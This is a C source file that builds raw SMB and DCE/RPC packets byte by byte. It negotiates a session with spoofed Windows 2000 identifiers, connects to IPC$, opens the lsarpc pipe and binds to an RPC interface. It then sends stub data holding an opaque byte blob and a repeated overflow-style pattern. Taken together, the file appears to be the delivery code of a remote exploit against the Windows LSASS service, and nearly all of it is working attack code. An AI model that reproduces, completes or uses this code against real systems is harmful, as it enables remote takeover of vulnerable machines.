#include <stdio.h>
#include <string.h>
#include "in_frontend.h"

struct packet NegotiateProtocolRequest2nd(struct smb_info info)
{
char data[]=
"\x00\x00\x00\x54\xff\x53\x4d\x42\x72\x00"
"\x00\x00\x00\x18\x01\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x98\x07\x00\x00\x5d\x4f\x00\x31\x00\x02\x4c\x41"
"\x4e\x4d\x41\x4e\x31\x2e\x30\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30"
"\x30\x32\x00\x02\x4e\x54\x20\x4c\x41\x4e\x4d\x41\x4e\x20\x31\x2e"
"\x30\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00";
	struct packet c;
    c.size=88;
    memset(c.buf,0,sizeof(c.buf));
    memcpy(c.buf,data,c.size);
    return c;
}

struct smb_info NegotiateProtocolRequestRESPONSE2nd(struct smb_info current)
{
    struct smb_info ret;
    ret = current;
    return ret;
}

struct packet SessionSetupAndXRequest2nd(struct smb_info info)
{
    char data[]=
"\x00\x00\x00\xac\xff\x53\x4d\x42\x73\x00"
"\x00\x00\x00\x18\x01\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x98\x07\x00\x00\x5d\x4f\x0c\xff\x00\x00\x00\xdf"
"\xff\x02\x00\x01\x00\x00\x00\x00\x00\x4e\x00\x00\x00\x00\x00\x5c"
"\xd0\x00\x80\x71\x00\x60\x4c\x06\x06\x2b\x06\x01\x05\x05\x02\xa0"
"\x42\x30\x40\xa0\x0e\x30\x0c\x06\x0a\x2b\x06\x01\x04\x01\x82\x37"
"\x02\x02\x0a\xa2\x2e\x04\x2c\x4e\x54\x4c\x4d\x53\x53\x50\x00\x01"
"\x00\x00\x00\x01\x02\x08\x00\x00\x00\x00\x00\x20\x00\x00\x00\x0c"
"\x00\x0c\x00\x20\x00\x00\x00\x57\x4f\x52\x4b\x53\x54\x41\x54\x49"
"\x4f\x4e\x31\x57\x69\x6e\x64\x6f\x77\x73\x20\x32\x30\x30\x30\x20"
"\x32\x31\x39\x35\x00\x57\x69\x6e\x64\x6f\x77\x73\x20\x32\x30\x30"
"\x30\x20\x35\x2e\x30\x00";
	struct packet c;
    c.size=176;
    memset(c.buf,0,sizeof(c.buf));
    memcpy(c.buf,data,c.size);
    return c;

}

struct smb_info SessionSetupAndXRequestRESPONSE2nd(struct smb_info current,struct packet b)
{
    struct smb_info ret;
    ret = current;
    ret.userid[0]=b.buf[32];
    ret.userid[1]=b.buf[33];
    return ret;
}

struct packet SessionSetupAndXRequest2ndb(struct smb_info info)
{
    char data[]=
"\x00\x00\x00\xf2\xff\x53\x4d\x42\x73\x00"
"\x00\x00\x00\x18\x01\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x98\x07\x00\x08\x5d\x4f\x0c\xff\x00\x00\x00\xdf"
"\xff\x02\x00\x01\x00\x00\x00\x00\x00\x94\x00\x00\x00\x00\x00\x5c"
"\xd0\x00\x80\xb7\x00\xa1\x81\x91\x30\x81\x8e\xa2\x81\x8b\x04\x81"
"\x88\x4e\x54\x4c\x4d\x53\x53\x50\x00\x03\x00\x00\x00\x18\x00\x18"
"\x00\x40\x00\x00\x00\x18\x00\x18\x00\x58\x00\x00\x00\x00\x00\x00"
"\x00\x70\x00\x00\x00\x00\x00\x00\x00\x70\x00\x00\x00\x18\x00\x18"
"\x00\x70\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x08"
"\x00\x00\x01\x02\x03\x04\x05\x06\x07\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x60\x16\xd5\x87\x35\xcf\xe2"
"\x94\x90\xce\x78\x50\x9b\x1f\x18\x7a\x4b\xf1\x20\x7b\x19\xea\x54"
"\xf0\x57\x00\x4f\x00\x52\x00\x4b\x00\x53\x00\x54\x00\x41\x00\x54"
"\x00\x49\x00\x4f\x00\x4e\x00\x32\x00\x57\x69\x6e\x64\x6f\x77\x73"
"\x20\x32\x30\x30\x30\x20\x32\x31\x39\x35\x00\x57\x69\x6e\x64\x6f"
"\x77\x73\x20\x32\x30\x30\x30\x20\x35\x2e\x30\x00";
    // USERID
    data[32]=info.userid[0];
    data[33]=info.userid[1];
	struct packet c;
    c.size=246;
    memset(c.buf,0,sizeof(c.buf));
    memcpy(c.buf,data,c.size);
    return c;

}

struct smb_info SessionSetupAndXRequestRESPONSE2ndb(struct smb_info current,struct packet b)
{
    struct smb_info ret;
    ret = current;
    ret.userid[0]=b.buf[32];
    ret.userid[1]=b.buf[33];
    return ret;
}

struct packet SessionSetupAndXRequest2ndc(struct smb_info info)
{
    char data[]=
"\x00\x00\x00\x62\xff\x53\x4d\x42\x73\x00"
"\x00\x00\x00\x18\x01\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x98\x07\x00\x00\x5d\x4f\x0d\xff\x00\x00\x00\xdf"
"\xff\x02\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x40\x00\x00\x00\x25\x00\x00\x00\x57\x69\x6e\x64\x6f\x77\x73"
"\x20\x32\x30\x30\x30\x20\x32\x31\x39\x35\x00\x57\x69\x6e\x64\x6f"
"\x77\x73\x20\x32\x30\x30\x30\x20\x35\x2e\x30\x00";
    // USERID
    data[32]=info.userid[0];
    data[33]=info.userid[1];
	struct packet c;
    c.size=102;
    memset(c.buf,0,sizeof(c.buf));
    memcpy(c.buf,data,c.size);
    return c;

}

struct smb_info SessionSetupAndXRequestRESPONSE2ndc(struct smb_info current,struct packet b)
{
    struct smb_info ret;
    ret = current;
    ret.userid[0]=b.buf[32];
    ret.userid[1]=b.buf[33];
    return ret;
}

struct packet TreeConnectAndXRequest2nd(struct smb_info info)
{
    char data1[]=
"\x00\x00\x00\x3a\xff\x53\x4d\x42\x75\x00"
"\x00\x00\x00\x18\x01\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x98\x07\x01\x08\x5d\x4f\x04\xff\x00\x00\x00\x00"
"\x00\x01\x00\x0f\x00\x00\x5c\x5c\x5c\x49\x50\x43\x24\x00\x3f\x3f"
"\x3f\x3f\x3f\x00";
    // USERID
    data1[32]=info.userid[0];
    data1[33]=info.userid[1];
	struct packet c;
    c.size=62;
    memset(c.buf,0,sizeof(c.buf));
    memcpy(c.buf,data1,c.size);
    return c;

}

struct smb_info TreeConnectAndXRequestRESPONSE2nd(struct smb_info current,struct packet b)
{
    struct smb_info ret;
    ret = current;
    ret.treeid[0]=b.buf[28];
    ret.treeid[1]=b.buf[29];
	ret.processid[0]=b.buf[30];
	ret.processid[1]=b.buf[31];
	ret.multiid[0]=b.buf[34];
	ret.multiid[1]=b.buf[35];
    return ret;
}



struct packet NTCreateAndXRequest2nd(struct smb_info info,char endpoint[100])
{
    char data[]=
"\x00\x00\x00\x5b\xff\x53\x4d\x42\xa2\x00"
"\x00\x00\x00\x18\x01\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x01\x00\x5c\x0a\x65\x00\xd9\xc9\x18\xff\x00\x00\x00\x00"
"\x07\x00\x16\x00\x00\x00\x00\x00\x00\x00\x9f\x01\x02\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x01\x00"
"\x00\x00\x40\x00\x00\x00\x02\x00\x00\x00\x00\x08\x00\x5c\x6c\x73"
"\x61\x72\x70\x63\x00";
	short old=9;
    char endpoint_c[64];
    memset(endpoint_c,0,sizeof(endpoint_c));
	endpoint_c[0]=0x5c;
int i=1;
    for(i;i<strlen(endpoint)+1;i++)
    {
        endpoint_c[i]=endpoint[i-1];
    }
	endpoint_c[strlen(endpoint)+2]=0;
    int l=strlen(endpoint)+2;
    // PROCESSID
    data[30]=info.processid[0];
    data[31]=info.processid[1];
    // MULTIID
    data[34]=info.multiid[0];
    data[35]=info.multiid[1];
    // USERID
    data[32]=info.userid[0];
    data[33]=info.userid[1];
    // TREEID
    data[28]=info.treeid[0];
    data[29]=info.treeid[1];
    // NETBIOS LENGTH
    data[3]=91;
    // FILENAME LENGTH
//    data[42]=l-1;
    // BYTE COUNT
//    data[85]=l;
	struct packet c;
    c.size=95;
    memset(c.buf,0,sizeof(c.buf));
	memcpy(c.buf,data,c.size);
//    memcpy(theApp.c.buf+87,endpoint_c,l);
//    theApp.c.size+=l;
    return c;

}

struct smb_info NTCreateAndXRequestRESPONSE2nd(struct smb_info current,struct packet b)
{
    struct smb_info ret;
    ret = current;
    ret.fid[0]=b.buf[42];
    ret.fid[1]=b.buf[43];
    return ret;
}


struct packet BINDRequest2nd(struct smb_info info,char uid[100],int ver)
{
    char data[]=
"\x00\x00\x00\x92\xff\x53\x4d\x42\x25\x00"
"\x00\x00\x00\x18\x01\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x01\x00\xac\x07\x65\x00\xbb\xf2\x10\x00\x00\x48\x00\x00"
"\x04\xe0\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4a"
"\x00\x48\x00\x4a\x00\x02\x00\x26\x00\x6c\x75\x4f\x00\x5c\x50\x49"
"\x50\x45\x5c\x00\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00"
"\x00\x00\x00\x00\xd0\x16\xd0\x16\x00\x00\x00\x00\x01\x00\x00\x00"
"\x00\x00\x01\x00\x6a\x28\x19\x39\x0c\xb1\xd0\x11\x9b\xa8\x00\xc0"
"\x4f\xd9\x2e\xf5\x00\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11"
"\x9f\xe8\x08\x00\x2b\x10\x48\x60\x02\x00\x00\x00";
	
	
	
	
	char uid_c[36],tok[3];
    memset(uid_c,0,sizeof(uid_c));
    memset(tok,0,sizeof(tok));
    sprintf(uid_c,"%s",uid);
    tok[0]=uid_c[0];
    tok[1]=uid_c[1];
    data[113]=hextoint(tok);
    tok[0]=uid_c[2];
    tok[1]=uid_c[3];
    data[112]=hextoint(tok);
    tok[0]=uid_c[4];
    tok[1]=uid_c[5];
    data[111]=hextoint(tok);
    tok[0]=uid_c[6];
    tok[1]=uid_c[7];
    data[110]=hextoint(tok);
    tok[0]=uid_c[8];
    tok[1]=uid_c[9];
    data[115]=hextoint(tok);
    tok[0]=uid_c[10];
    tok[1]=uid_c[11];
    data[114]=hextoint(tok);
    tok[0]=uid_c[12];
    tok[1]=uid_c[13];
    data[117]=hextoint(tok);
    tok[0]=uid_c[14];
    tok[1]=uid_c[15];
    data[116]=hextoint(tok);
    tok[0]=uid_c[16];
    tok[1]=uid_c[17];
    data[118]=hextoint(tok);
    tok[0]=uid_c[18];
    tok[1]=uid_c[19];
    data[119]=hextoint(tok);
    tok[0]=uid_c[20];
    tok[1]=uid_c[21];
    data[120]=hextoint(tok);
    tok[0]=uid_c[22];
    tok[1]=uid_c[23];
    data[121]=hextoint(tok);
    tok[0]=uid_c[24];
    tok[1]=uid_c[25];
    data[122]=hextoint(tok);
    tok[0]=uid_c[26];
    tok[1]=uid_c[27];
    data[123]=hextoint(tok);
    tok[0]=uid_c[28];
    tok[1]=uid_c[29];
    data[124]=hextoint(tok);
    tok[0]=uid_c[30];
    tok[1]=uid_c[31];
    data[125]=hextoint(tok);
    data[126]=ver;
    // PROCESSID
    data[30]=info.processid[0];
    data[31]=info.processid[1];
    // MULTIID
    data[34]=info.multiid[0];
    data[35]=info.multiid[1];
    // USERID
    data[32]=info.userid[0];
    data[33]=info.userid[1];
    // TREEID
    data[28]=info.treeid[0];
    data[29]=info.treeid[1];
    // FID
    data[67]=info.fid[0];
    data[68]=info.fid[1];
	struct packet c;
    c.size=150;
    memset(c.buf,0,sizeof(c.buf));
    memcpy(c.buf,data,c.size);
    return c;

}

struct smb_info BINDRequestRESPONSE2nd(struct smb_info current,struct packet b)
{
    struct smb_info ret;
    ret = current;
	ret.callid=b.buf[72];
    return ret;
}

struct packet UniversalMethod(struct smb_info info,struct packet stub,char opnum)
{
    char data[]=
"\x00\x00\x04\x57\xff\x53\x4d\x42\x2f\x00"
"\x00\x00\x00\x18\x01\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x08\x98\x07\x01\x08\x5d\x4f\x0e\xff\x00\x00\x00\x00"
"\x40\x00\x00\x00\x00\xff\xff\xff\xff\x08\x00\x18\x04\x00\x00\x18"
"\x04\x3f\x00\x00\x00\x00\x00\x18\x04\x05\x00\x00\x01\x10\x00\x00"
"\x00\x18\x04\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x1f"
"\x00\xc7\x0a\x55\xa3\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00"
"\x00\x00\x00\x70\x01\x15\x02\x00\x00\x00\x00\x00\x00\x15\x02\x00"
"\x00\xf5\xd6\x91\x4f\x3f\x97\x46\x4f\x46\xfc\x4f\x97\x41\x4e\x9b"
"\xfd\x99\x41\x41\x40\x42\x97\x4a\x9f\x4f\x46\x43\xf9\x48\x98\x96"
"\xf8\x99\x99\x4b\x4e\x37\x49\xd6\x9b\x47\x93\x98\x3f\x46\x48\x37"
"\x49\x46\x4a\xf5\x47\x48\x3f\x40\xf8\x4b\x9f\x4a\x9b\x48\x9b\x4a"
"\x9b\x90\xf5\x99\x49\xfc\x9b\x4b\xf8\x96\x41\x99\xf9\x90\x3f\x9f"
"\x4f\x4e\xd6\x92\x41\x9f\x47\xfd\x4e\x4e\x99\xf9\xfd\x93\x43\x4b"
"\x37\xd6\x98\xf5\x4b\x98\xfd\x4f\x4a\x3f\x93\x42\x46\x43\x90\xf5"
"\x3f\x98\x9b\x49\x49\xf8\x98\x4a\xf5\xf8\x90\x9f\x96\x40\x9f\x43"
"\x49\x96\x43\x91\x37\x27\xf9\x4e\x4a\x4a\x4e\x4e\xfc\x4b\x37\x9f"
"\xf9\xfd\x4b\x49\x46\x48\x42\xf5\x4e\x3f\xfd\x91\x92\x4a\xfc\x9b"
"\x96\x47\x43\xfc\x42\x97\x27\x41\x9b\x4a\x37\x27\xf5\x48\x98\x9f"
"\x41\x4a\x4b\x4e\x43\x99\x47\x92\x47\x9b\x49\x37\x37\x4f\xfc\x92"
"\x4f\x9b\x48\x37\x43\xf8\x27\x92\x92\x37\x4f\x46\x37\x48\x46\x42"
"\x43\x40\xd6\xd6\x9f\x41\xf8\x9f\x92\x46\xfd\x42\xd6\xf8\x41\x93"
"\x3f";
    // USERID
    data[32]=info.userid[0];
    data[33]=info.userid[1];
    // TREEID
    data[28]=info.treeid[0];
    data[29]=info.treeid[1];
    // PROCESSID
    data[30]=info.processid[0];
    data[31]=info.processid[1];
    // MULTIID
    data[34]=info.multiid[0];
    data[35]=info.multiid[1];
    // FID
    data[41]=info.fid[0];
    data[42]=info.fid[1];
	// CALL ID
	data[79]=info.callid;
    // OPNUM
    data[89]=opnum;
    // NETBIOS LENGTH
    int s=87+stub.size;
    data[1]=(s<<8)>>24;
    data[2]=(s<<16)>>24;
    data[3]=(s<<24)>>24;
    // TOTAL DATA COUNT
    s=24+stub.size;
    data[54]=(s<<16)>>24;
    data[53]=(s<<24)>>24;
    // PARAMETER OFFSET
    s=24+stub.size;
    data[58]=(s<<16)>>24;
    data[57]=(s<<24)>>24;
    // DATA COUNT
    s=24+stub.size;
    data[66]=(s<<16)>>24;
    data[65]=(s<<24)>>24;
    // DATA OFFSET
    s=24+stub.size;
    data[76]=(s<<16)>>24;
    data[75]=(s<<24)>>24;
	struct packet c;
    c.size=91;// PACCHETTO DCE
    memset(c.buf,0,sizeof(c.buf));
    memcpy(c.buf,data,c.size);
    memcpy(c.buf+c.size,stub.buf,stub.size);
    c.size+=stub.size;//STUB DATA
    return c;

}

struct smb_info UniversalMethodRESPONSE(struct smb_info current)
{
    struct smb_info ret;
    ret = current;
    return ret;
}

struct packet UniversalMethodFinal(struct smb_info info,struct packet stub,char opnum)
{
    char data[]=
"\x00\x00\x00\xca\xff\x53\x4d\x42\x25\x00"
"\x00\x00\x00\x18\x01\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x08\x98\x07\x01\x08\x5d\x4f\x10\x00\x00\x80\x00\x00"
"\x04\xe0\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4a"
"\x00\x80\x00\x4a\x00\x02\x00\x26\x00\x00\x40\x87\x00\x5c\x50\x49"
"\x50\x45\x5c\x00\x05\x00\x00\x02\x10\x00\x00\x00\x80\x00\x00\x00"
"\x00\x00\x00\x00\x68\x00\x00\x00\x00\x00\x1f\x00\xed\xfe\x78\x4f"
"\x72\x7d\x87\x99\x04\x08\x02\x00\x04\x08\x02\x00\x04\x08\x02\x00"
"\x04\x08\x02\x00\x04\x08\x02\x00\x04\x08\x02\x00\x04\x08\x02\x00"
"\x04\x08\x02\x00\x04\x08\x02\x00\x04\x08\x02\x00\x04\x08\x02\x00"
"\x04\x08\x02\x00\x04\x08\x02\x00\x04\x08\x02\x00\x04\x08\x02\x00"
"\x04\x08\x02\x00\x00\x00\xad\x32\x07\x00\x00\x00\x02\x00\x00\x00"
"\x00\x00\x00\x00\x02\x00\x00\x00\xeb\x02\x00\x00\x50\x00\x00\x00"
"\x00\x00\x00\x00";
    // USERID
    data[32]=info.userid[0];
    data[33]=info.userid[1];
    // TREEID
    data[28]=info.treeid[0];
    data[29]=info.treeid[1];
    // PROCESSID
    data[30]=info.processid[0];
    data[31]=info.processid[1];
    // MULTIID
    data[34]=info.multiid[0];
    data[35]=info.multiid[1];
    // FID
    data[67]=info.fid[0];
    data[68]=info.fid[1];
	// CALL ID
	data[90]=info.callid;
    // OPNUM
    data[100]=opnum;
    // NETBIOS LENGTH
    int s=202-104+stub.size;
    data[1]=(s<<8)>>24;
    data[2]=(s<<16)>>24;
    data[3]=(s<<24)>>24;
    // TOTAL DATA COUNT
    s=24+stub.size;
    data[40]=(s<<16)>>24;
    data[39]=(s<<24)>>24;
    // PARAMETER OFFSET
    s=24+stub.size;
    data[60]=(s<<16)>>24;
    data[59]=(s<<24)>>24;
    // DATA COUNT
    s=31+stub.size;
    data[70]=(s<<16)>>24;
    data[69]=(s<<24)>>24;
    // DATA OFFSET
    s=stub.size+24;
    data[87]=(s<<16)>>24;
    data[86]=(s<<24)>>24;
    // DATA OFFSET
    s=stub.size;
    data[95]=(s<<16)>>24;
    data[94]=(s<<24)>>24;
	struct packet c;
    c.size=102;// PACCHETTO DCE
    memset(c.buf,0,sizeof(c.buf));
    memcpy(c.buf,data,c.size);
    memcpy(c.buf+c.size,stub.buf,stub.size);
    c.size+=stub.size;//STUB DATA
    return c;

}

struct smb_info UniversalMethodRESPONSEFinal(struct smb_info current)
{
    struct smb_info ret;
    ret = current;
    return ret;
}

int hextoint(const char *value)
{
  struct CHexMap
  {
    char chr;
    int value;
  };
  const int HexMapL = 16;
  struct CHexMap HexMap[16] =
  {
    {'0', 0}, {'1', 1},
    {'2', 2}, {'3', 3},
    {'4', 4}, {'5', 5},
    {'6', 6}, {'7', 7},
    {'8', 8}, {'9', 9},
    {'A', 10}, {'B', 11},
    {'C', 12}, {'D', 13},
    {'E', 14}, {'F', 15}
  };
char ax[100];
memset(ax,0,sizeof(ax));
sprintf(ax,"%s",value);
int y=0;
for(y;y<strlen(ax);y++){if(ax[y]>0x60 && ax[y]<0x7b){ax[y]-=0x20;}}
  char *mstr = strdup(ax);
  char *s = mstr;
  int result = 0;
  if (*s == '0' && *(s + 1) == 'X') s += 2;
  int firsttime = 1;
  while (*s != '\0')
  {
    int found = 0;
	int i;
    for (i = 0; i < HexMapL; i++)
    {
      if (*s == HexMap[i].chr)
      {
        if (!firsttime) result <<= 4;
        result |= HexMap[i].value;
        found = 1;
        break;
      }
    }
    if (!found) break;
    s++;
    firsttime = 0;
  }
  free(mstr);
  return result;
}

